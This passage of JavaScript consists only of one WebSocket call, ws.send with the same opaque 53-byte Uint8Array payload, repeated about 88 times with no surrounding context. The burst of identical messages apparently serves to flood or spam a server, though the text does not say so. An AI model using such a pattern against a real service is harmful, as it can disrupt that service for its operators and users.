                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
